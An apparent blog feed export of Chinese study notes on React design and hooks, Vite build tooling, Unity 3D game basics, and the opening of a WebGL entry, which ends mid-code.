    <content type="html"><![CDATA[<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h2 id="一、应用"><a href="#一、应用" class="headerlink" title="一、应用"></a>一、应用</h2><ul><li>前端应用</li><li>移动原生</li><li>桌面应用Electron  React 3D</li></ul><h2 id="二、原型"><a href="#二、原型" class="headerlink" title="二、原型"></a>二、原型</h2><ol><li>Facebook在其php生态中引入了组合式组件的思想，启发了后来的react设计</li><li>J.W创建了FaxJS,也就是React的原型；</li><li>Facebook收购ins后，该项目在内使用，基于FaxJS创建了React；</li></ol><h2 id="三、React设计思路"><a href="#三、React设计思路" class="headerlink" title="三、React设计思路"></a>三、React设计思路</h2><h3 id="1-UI编程痛点"><a href="#1-UI编程痛点" class="headerlink" title="1.UI编程痛点"></a>1.UI编程痛点</h3><ul><li>状态更新，UI不会自动更新，需要手动调用DOM</li><li>欠缺基本的代码层面的封装和隔离，代码层面没有组件化</li><li>UI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”</li></ul><h3 id="2-响应式与转换式"><a href="#2-响应式与转换式" class="headerlink" title="2.响应式与转换式"></a>2.响应式与转换式</h3><ul><li>转换式：给定输入求解输出；  （编译器、数值计算）</li><li>响应式：监听事件没消息驱动； （监控系统、UI界面）</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">事件-&gt;执行既定的回调-&gt;状态更新-&gt;UI更新<br></code></pre></td></tr></table></figure><h3 id="3-响应式编程"><a href="#3-响应式编程" class="headerlink" title="3.响应式编程"></a>3.响应式编程</h3><ul><li>状态更新，UI自动更新</li><li>前端代码组件化、可复用、可封装</li><li>状态之间的互相依赖关系、只需要声明计科</li></ul><h3 id="4-组件化"><a href="#4-组件化" class="headerlink" title="4.组件化"></a>4.组件化</h3><ul><li>组件是组件的组合/原子组件</li><li>组件内部拥有状态，外部不可见</li><li>父组件可将状态传入组件内部</li></ul><h3 id="5-状态归属问题"><a href="#5-状态归属问题" class="headerlink" title="5.状态归属问题"></a>5.状态归属问题</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">Note：共享变量需要提升到最近的祖先组件、可以用状态管理解决；<br><span class="hljs-symbol">E.g:</span>如果状态归属于两个节点，就向上寻找到最近的祖宗节点；<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/01/30/edd9edf1a3d14f27.jpg"></p><blockquote><p>Javascript中、函数是【一等公民】</p><p>**通过向子组件传递function来改变根组件的变量（形成双向数据流）</p></blockquote><h3 id="6-思考"><a href="#6-思考" class="headerlink" title="6.思考"></a>6.思考</h3><ul><li>React是单向数据流、还是双向数据流？</li></ul><blockquote><p>其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；</p></blockquote><ul><li>如何解决状态不合理上升的问题？（第五节解决）</li></ul><blockquote><p>状态管理库</p></blockquote><ul><li>组件的状态改变之后，如何更新DOM？（第四节解决）</li></ul><blockquote><p>1</p></blockquote><h3 id="7-组件设计"><a href="#7-组件设计" class="headerlink" title="7.组件设计"></a>7.组件设计</h3><ul><li>组件声明了状态和UI的映射；</li><li>组件拥有Props/State两种状态；</li><li>组件可由其他组件拼装而成；</li></ul><p>解法：</p><ul><li>组件内部拥有私有状态State</li><li>组件接受外部的Props状态提供复用性</li><li>根据当前的state/props返回一个UI</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs react">function Component(props)&#123;<br>    const &#123;url&#125;=props;<br>    this.text=&#x27;click me&#x27;;<br>    <br>    return(<br>    &lt;div&gt;<br>        &lt;SubComponent props=&#123;&#123;color:&#x27;red&#x27;&#125;&#125;&gt;&lt;/SubComponent&gt;<br>            &lt;img src=&#123;url&#125;&gt;&lt;/img&gt;<br>            &lt;button&gt;clike me&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-生命周期"><a href="#8-生命周期" class="headerlink" title="8.生命周期"></a>8.生命周期</h3><p><img src="https://s3.bmp.ovh/imgs/2023/01/30/4fc6e86cf176a88b.jpg"></p><h3 id="9-React-Hooks"><a href="#9-React-Hooks" class="headerlink" title="9.React Hooks"></a>9.React Hooks</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs react">import React,&#123;useState&#125; from &#x27;react&#x27;;<br><br>function Example()&#123;<br>    //声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；<br>    const [count,setState]=useState(0);<br>    <br>    //传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行<br>    //有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；<br>    useEffect(()=&gt;&#123;<br>        document.title=`You clicked $&#123;count&#125; times`;<br>    &#125;)<br>    <br>    return(<br>    &lt;div&gt;<br>        &lt;p&gt;Clicked &#123; count &#125; times&lt;/p&gt;<br>            &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt;Click +1&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hook使用法则"><a href="#Hook使用法则" class="headerlink" title="Hook使用法则"></a>Hook使用法则</h3><ul><li>不要在循环、条件或嵌套中调用hook</li></ul><h2 id="四、React实现"><a href="#四、React实现" class="headerlink" title="四、React实现"></a>四、React实现</h2><h3 id="1-Problems"><a href="#1-Problems" class="headerlink" title="1.Problems"></a>1.Problems</h3><ul><li>JSX不符合JS语法标准；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/01/30/1fc630e94d6d6c60.jpg"></p><ul><li>返回的JSX发生改变时，如何更新DOM；</li></ul><blockquote><p>计算新旧JSX的Difference</p></blockquote><ul><li>指令式：说一步做一步</li><li>声明式</li><li>响应式</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/01/30/9ff90ed31b0de3e3.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/01/30/cf361645d5820a2d.jpg"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">state</span>改变-&gt;计算diff-&gt;更新dom<br><br>How <span class="hljs-keyword">to</span> diff?<br><br>更新次数少<span class="hljs-variable">&lt;----tradeoff----&gt;</span>计算速度快<br>完美的最小Diff算法，需要O(n^<span class="hljs-number">3</span>)<br>换取时间，需要O（n）<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">元素</th><th align="center">更新方法</th></tr></thead><tbody><tr><td align="center">不同类型元素</td><td align="center">替换</td></tr><tr><td align="center">同类型的DOM元素</td><td align="center">更新</td></tr><tr><td align="center">同类型的组件元素</td><td align="center">递归</td></tr></tbody></table><p>弊病：最顶层的父组件状态发生改变，子组件全部更新</p><ul><li>state/props改变时，如何重新触发render函数；</li></ul><h2 id="五、React状态管理库"><a href="#五、React状态管理库" class="headerlink" title="五、React状态管理库"></a>五、React状态管理库</h2><h3 id="1-核心思想"><a href="#1-核心思想" class="headerlink" title="1.核心思想"></a>1.核心思想</h3><blockquote><p>***将状态抽离到UI外部进行统一管理</p><p>只存放需要共享的、距离较远的</p></blockquote><h3 id="2-常用管理库推荐"><a href="#2-常用管理库推荐" class="headerlink" title="2.常用管理库推荐"></a>2.常用管理库推荐</h3><ul><li>redux</li><li>xstate</li><li>mobx</li><li>recoil</li></ul><h3 id="3-状态机"><a href="#3-状态机" class="headerlink" title="3.状态机"></a>3.状态机</h3><blockquote><p>当前状态，收到外部事件，迁移到下一个状态</p></blockquote><h3 id="4-ModernJS-Reduck"><a href="#4-ModernJS-Reduck" class="headerlink" title="4.ModernJS/Reduck"></a>4.ModernJS/Reduck</h3><h2 id="六、应用级框架科普"><a href="#六、应用级框架科普" class="headerlink" title="六、应用级框架科普"></a>六、应用级框架科普</h2><ul><li>NextJS  (研究一下Vercel)</li><li>ModernJS (Web Infra)全栈开发框架</li><li>Blitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 </li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vite知识体系</title>
    <link href="/2023/03/27/Vite%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"/>
    <url>/2023/03/27/Vite%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Vite知识体系"><a href="#Vite知识体系" class="headerlink" title="Vite知识体系"></a>Vite知识体系</h1><h2 id="一、浅谈构建工具"><a href="#一、浅谈构建工具" class="headerlink" title="一、浅谈构建工具"></a>一、浅谈构建工具</h2><h3 id="1-Why-we-need-build-tools"><a href="#1-Why-we-need-build-tools" class="headerlink" title="1. Why we need build tools?"></a>1. Why we need build tools?</h3><ul><li>模块化（ESM、CommonJS、UMD）</li><li>资源编译（高级语法的编译）</li><li>产物质量（代码提及、代码性能）</li><li>开发效率（热更新）</li></ul><h3 id="2-构建工具的意义"><a href="#2-构建工具的意义" class="headerlink" title="2.构建工具的意义"></a>2.构建工具的意义</h3><ul><li>提供模块加载方案、兼容不同的模块规范；</li><li>高级语法转义（Sass，TS）、资源加载如图片、字体、worker；</li><li>产物压缩、无用代码删除、语法降级；</li><li>热更新；</li></ul><h3 id="3-Vite是什么？Why-vite？"><a href="#3-Vite是什么？Why-vite？" class="headerlink" title="3.Vite是什么？Why vite？"></a>3.Vite是什么？Why vite？</h3><h5 id="组成："><a href="#组成：" class="headerlink" title="组成："></a>组成：</h5><ul><li>No-bundle开发服务、源文件无需打包；</li><li>生产环境基于Rollup的Bundler；</li></ul><h5 id="核心特征："><a href="#核心特征：" class="headerlink" title="核心特征："></a>核心特征：</h5><ul><li>高性能，dev启动速度和热更新速度非常快；</li><li>简单易用，开发者体验好；</li></ul><h3 id="4-当下问题"><a href="#4-当下问题" class="headerlink" title="4.当下问题"></a>4.当下问题</h3><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ul><li>缓慢启动；</li><li>缓慢的热更新；</li></ul><h5 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h5><ul><li>bundle带来的性能开销；</li><li>JS语言的性能瓶颈；</li></ul><h5 id="行业趋势"><a href="#行业趋势" class="headerlink" title="行业趋势"></a>行业趋势</h5><ul><li>全球浏览器对原生ESM的普遍支持；</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-number">1</span>.script标签增加<span class="hljs-keyword">type</span>=“<span class="hljs-class"><span class="hljs-keyword">module</span>”属性；</span><br><span class="hljs-number">2</span>.使用ESM模块导入导出语法；<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/954d53ed35dab73a.jpg"></p><ul><li>基于原生语言（Go、Rust）编写前端编译工具链；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/a162a7181e2b1488.jpg"></p><h2 id="二、Vite概要"><a href="#二、Vite概要" class="headerlink" title="二、Vite概要"></a>二、Vite概要</h2><h3 id="1-内置Web构建功能"><a href="#1-内置Web构建功能" class="headerlink" title="1.内置Web构建功能"></a>1.内置Web构建功能</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/b6130def732894e1.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/5766272cb741272e.jpg"></p><h2 id="三、Vite上手"><a href="#三、Vite上手" class="headerlink" title="三、Vite上手"></a>三、Vite上手</h2><h3 id="1-项目初始化"><a href="#1-项目初始化" class="headerlink" title="1.项目初始化"></a>1.项目初始化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">提前安装pnpm</span><br>npm i -g pnpm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化命令</span><br>pnpm create vite<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装依赖</span><br>pnpm install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动项目</span><br>npm run dev<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装sass</span><br>pnpm install sass -D<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">打包</span><br>tsc &amp;&amp; vite build<br><br></code></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./index.module.scss&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;styles.header&#125;</span>&gt;</span>Header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-class">.header</span>&#123;<br>    <span class="hljs-attribute">color</span>:red;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-无需额外配置"><a href="#2-无需额外配置" class="headerlink" title="2.无需额外配置"></a>2.无需额外配置</h3><blockquote><p>可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；</p></blockquote><h3 id="3-Tree-Shaking"><a href="#3-Tree-Shaking" class="headerlink" title="3.Tree Shaking"></a>3.Tree Shaking</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li>基于ESM的import/export语句依赖关系，与实时状态无关；</li><li>在构建阶段将未使用到的代码进行删除；</li><li>Tree shaking 在vite中无需配置，默认开启；</li></ul><h3 id="4-优点"><a href="#4-优点" class="headerlink" title="4.优点"></a>4.优点</h3><ul><li>响应迅速</li><li>开箱即用</li></ul><h2 id="四、Vite整体架构"><a href="#四、Vite整体架构" class="headerlink" title="四、Vite整体架构"></a>四、Vite整体架构</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/9290159fce29e6d4.jpg"></p><h3 id="1-单文件编译"><a href="#1-单文件编译" class="headerlink" title="1.单文件编译"></a>1.单文件编译</h3><blockquote><p>使用Esbuild编译TS/TSX；</p><p>预打包：扫描代码进行预先打包；</p></blockquote><h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul><li>编译速度提升10-100X</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>不支持类型检查；（运行之前需要调用<code>tsc</code>）</li><li>不支持语法降级到ES5；</li></ul><h3 id="2-代码压缩"><a href="#2-代码压缩" class="headerlink" title="2.代码压缩"></a>2.代码压缩</h3><blockquote><p>Esbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；</p></blockquote><h3 id="3-插件机制"><a href="#3-插件机制" class="headerlink" title="3.插件机制"></a>3.插件机制</h3><ul><li>开发环境：模拟roolup插件机制</li><li>生产环境：直接使用rollup</li></ul><h2 id="五、Vite进阶路线"><a href="#五、Vite进阶路线" class="headerlink" title="五、Vite进阶路线"></a>五、Vite进阶路线</h2><h3 id="1-深入双引擎"><a href="#1-深入双引擎" class="headerlink" title="1.深入双引擎"></a>1.深入双引擎</h3><ul><li>esbuild</li><li>rollupJS</li></ul><h5 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h5><ul><li>查看官方文档</li><li>先了解基本使用，动手尝试各项常用配置；</li><li>学习其插件开发；</li></ul><h3 id="2-插件机制"><a href="#2-插件机制" class="headerlink" title="2.插件机制"></a>2.插件机制</h3><ul><li>易于抽离核心逻辑</li><li>易于拓展</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/8ef80e5113384463.jpg"></p><ul><li>config</li><li>resolveId</li><li>load</li><li>tranform</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/ad4af8b0fc78d654.jpg"></p><h3 id="3-学习"><a href="#3-学习" class="headerlink" title="3.学习"></a>3.学习</h3><ul><li>Vite插件开发文档；</li><li>学习其他插件实现，json加载等；</li></ul><h3 id="4-拆包（代码分割）"><a href="#4-拆包（代码分割）" class="headerlink" title="4.拆包（代码分割）"></a>4.拆包（代码分割）</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/62c96b5942f5b559.jpg"></p><h3 id="5-JS编译工具（Babel）"><a href="#5-JS编译工具（Babel）" class="headerlink" title="5.JS编译工具（Babel）"></a>5.JS编译工具（Babel）</h3><p>源代码-&gt;AST-&gt;AST-&gt;降级代码</p><ul><li>AST为抽象语法树；</li></ul><h3 id="6-语法安全降级"><a href="#6-语法安全降级" class="headerlink" title="6.语法安全降级"></a>6.语法安全降级</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/7bd9f45a3245d6e7.jpg"></p><ul><li>上层解决方案：plugin-legacy</li><li>底层原理：借助babel实现；提前注入polyfill；</li></ul><h3 id="7-服务端渲染（SSR）"><a href="#7-服务端渲染（SSR）" class="headerlink" title="7.服务端渲染（SSR）"></a>7.服务端渲染（SSR）</h3><ul><li>提升首屏性能</li><li>SEO优化；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/c849fc3dd53d12c8.jpg"></p><h3 id="8-深入理解底层标准"><a href="#8-深入理解底层标准" class="headerlink" title="8.深入理解底层标准"></a>8.深入理解底层标准</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/5a034d64573a380a.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>项目构建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3D游戏开发</title>
    <link href="/2023/03/27/3D%E6%B8%B8%E6%88%8F%E5%AE%9E%E6%88%98/"/>
    <url>/2023/03/27/3D%E6%B8%B8%E6%88%8F%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="3D游戏开发"><a href="#3D游戏开发" class="headerlink" title="3D游戏开发"></a>3D游戏开发</h1><h2 id="一、3D实体搭建"><a href="#一、3D实体搭建" class="headerlink" title="一、3D实体搭建"></a>一、3D实体搭建</h2><h3 id="1-3D实体"><a href="#1-3D实体" class="headerlink" title="1.3D实体"></a>1.3D实体</h3><h4 id="位姿态"><a href="#位姿态" class="headerlink" title="位姿态"></a>位姿态</h4><ul><li>位置：Position（x,y,z）</li><li>旋转：Rotation（x,y,z)</li><li>缩放：Scale（x,y,z)</li></ul><blockquote><p>Unity中，绝大部分情况下，是先缩放，后旋转，最后平移；</p></blockquote><h4 id="3D实体的创建"><a href="#3D实体的创建" class="headerlink" title="3D实体的创建"></a>3D实体的创建</h4><ul><li>通过加载3D模型创建，如fbx、gltf、obj</li><li>通过组合参数化的基本集合体创建</li></ul><h4 id="实体绘制"><a href="#实体绘制" class="headerlink" title="实体绘制"></a>实体绘制</h4><ul><li>材质</li><li>颜色</li><li>纹理</li></ul><h4 id="预制体"><a href="#预制体" class="headerlink" title="预制体"></a>预制体</h4><ul><li>将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；</li><li>预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；</li></ul><h2 id="二、相机、光照、天空盒"><a href="#二、相机、光照、天空盒" class="headerlink" title="二、相机、光照、天空盒"></a>二、相机、光照、天空盒</h2><h3 id="1-相机"><a href="#1-相机" class="headerlink" title="1.相机"></a>1.相机</h3><ul><li>Clear Flag</li><li>背景颜色</li><li>Culling Mask</li><li>投影（透视、正交）</li></ul><p>透视是存在近大远小，正交是没有的；</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/15/4dc7ee72a6e9dfda.jpg"></p><h3 id="2-光照"><a href="#2-光照" class="headerlink" title="2.光照"></a>2.光照</h3><ul><li>类型：点光源、平行光、聚光灯、面积光</li><li>颜色</li><li>强度</li><li>阴影乐星</li></ul><h3 id="3-天空盒"><a href="#3-天空盒" class="headerlink" title="3.天空盒"></a>3.天空盒</h3><ul><li>相机的清除标志设为“天空盒”</li><li>窗口-渲染-照明设置</li><li>环境-天空盒材质</li></ul><h2 id="三、控制和碰撞"><a href="#三、控制和碰撞" class="headerlink" title="三、控制和碰撞"></a>三、控制和碰撞</h2><h3 id="1-启动流程"><a href="#1-启动流程" class="headerlink" title="1.启动流程"></a>1.启动流程</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/15/e6cf1e6d09956c34.jpg"></p><h3 id="2-控制逻辑"><a href="#2-控制逻辑" class="headerlink" title="2.控制逻辑"></a>2.控制逻辑</h3><ul><li>添加刚体组件（运动过程中不会发生形变的物体）</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">添加组件；<br><span class="hljs-keyword">Use</span> Gravity设置为<span class="hljs-literal">false</span><br>isKinematic设置为<span class="hljs-literal">true</span>，飞船通过脚本而非力影响运动属性<br>设置constraints，冻结z轴位移以及x、y、z轴旋转<br><br></code></pre></td></tr></table></figure><ul><li>添加自定义脚本</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">add</span> component &gt; new<span class="hljs-built_in"> script</span><br><span class="hljs-built_in"></span><br>MonoBehavior是一个基类，所有Unity脚本都派生自该类；<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/15/99791d98ab219a60.jpg"></p><h4 id="Input-GetAxis-和输入管理器InputManager"><a href="#Input-GetAxis-和输入管理器InputManager" class="headerlink" title="Input.GetAxis()和输入管理器InputManager"></a>Input.GetAxis()和输入管理器InputManager</h4><blockquote><p>InputManager是Unity设置输入响应方式的管理列表，Edit &gt; Project &gt; Setting &gt; Input</p></blockquote><ul><li>添加敌机</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">需要使用另一个脚本；<br>不受按键控制；<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">随机生成敌机<br>新建一个<span class="hljs-selector-tag">Main</span>的C#脚本，绑定到<span class="hljs-selector-tag">Main</span> camera(因为敌机伴随整个游戏周期，所以绑定到Camera)<br></code></pre></td></tr></table></figure><h3 id="3-碰撞逻辑"><a href="#3-碰撞逻辑" class="headerlink" title="3.碰撞逻辑"></a>3.碰撞逻辑</h3><h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><blockquote><p>Edit &gt; Project &gt;Tags and Layers 命令</p><p>不同Layers的实体不会发生碰撞；</p></blockquote><h4 id="物理管理器"><a href="#物理管理器" class="headerlink" title="物理管理器"></a>物理管理器</h4><blockquote><p>Edit &gt; Project Setting &gt; Physics</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/15/5bba664ee9c8df56.jpg"></p><h4 id="碰撞"><a href="#碰撞" class="headerlink" title="碰撞"></a>碰撞</h4><blockquote><p>3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；</p></blockquote><h2 id="四、玩法逻辑和UI"><a href="#四、玩法逻辑和UI" class="headerlink" title="四、玩法逻辑和UI"></a>四、玩法逻辑和UI</h2><h3 id="1-添加新的刚体"><a href="#1-添加新的刚体" class="headerlink" title="1.添加新的刚体"></a>1.添加新的刚体</h3><ul><li>子弹</li><li>升级道具</li></ul><h3 id="2-添加玩法"><a href="#2-添加玩法" class="headerlink" title="2.添加玩法"></a>2.添加玩法</h3><ul><li>为每一个敌机设计分数</li><li>添加计分板</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/15/5d64aadbdbbbbe32.jpg"></p><h5 id="推荐课程"><a href="#推荐课程" class="headerlink" title="推荐课程"></a>推荐课程</h5><ul><li>现代计算机图形学入门-闫令其</li><li>现代游戏引擎入门必修课-王希</li><li>高质量试试渲染-闫</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>3D</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebGL</title>
    <link href="/2023/03/27/WebGL%E6%9C%88%E5%BD%B1%E5%B8%A6%E7%BB%83/"/>
    <url>/2023/03/27/WebGL%E6%9C%88%E5%BD%B1%E5%B8%A6%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="WebGL"><a href="#WebGL" class="headerlink" title="WebGL"></a>WebGL</h1><h2 id="一、Why-WebGL？Why-GPU？"><a href="#一、Why-WebGL？Why-GPU？" class="headerlink" title="一、Why WebGL？Why GPU？"></a>一、Why WebGL？Why GPU？</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">GPU!=WebGL!=<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><h3 id="1-现代图形系统"><a href="#1-现代图形系统" class="headerlink" title="1.现代图形系统"></a>1.现代图形系统</h3><ul><li>光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；</li><li>像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；</li><li>帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；</li></ul><h5 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h5><ul><li>轮廓提取/ meshing</li><li>光栅化</li><li>帧缓存</li><li>渲染</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/14/57143b0a02e56c3d.jpg"></p><p>$$<br>Data-&gt;Processor-&gt;Frame Buffer-&gt;Pixel<br>$$<br>GPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；</p><h3 id="2-WebGL"><a href="#2-WebGL" class="headerlink" title="2.WebGL"></a>2.WebGL</h3><p>$$<br>OpenGL—-js接口—-&gt;WebGL<br>$$</p><h5 id="WebGL代码流程"><a href="#WebGL代码流程" class="headerlink" title="WebGL代码流程"></a>WebGL代码流程</h5><ul><li>创建WebGL上下文</li><li>创建WebGL Program</li><li>将数据存入缓冲区</li><li>将缓冲区数据读取到GPU</li><li>GPU执行WebGL程序，输出结果</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/14/204b3600bac6924e.jpg"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//define shaders</span><br><br><span 